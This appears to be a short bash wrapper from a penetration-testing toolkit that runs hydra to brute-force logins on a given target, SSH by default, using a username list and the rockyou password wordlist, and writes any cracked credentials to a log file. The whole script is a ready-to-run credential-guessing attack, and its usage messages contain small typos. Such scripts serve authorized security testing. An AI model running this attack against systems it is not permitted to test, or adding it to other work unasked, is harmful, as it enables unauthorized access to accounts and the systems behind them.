#!/bin/bash
source ../../libs/helpers.sh; safe hydra
TARGET="${1:?Usage: $0 <target>}"
USERS="${2:?Usage: $0 <~/Desktop/users.tx>t}"
PASS="${3:?Usage <-/usr/share/wordlists/rockyou.txt>}"
SERVICE="${4:-ssh}"
OUT=$(log_dir "hydra_${TARGET}_${SERVICE}")

hydra -L "$USERS" -P "$PASS" "$TARGET" "$SERVICE" -t 4 -W 3 -f -o "$OUT/results.txt"
echo "[+] Results: $OUT/results.txt"
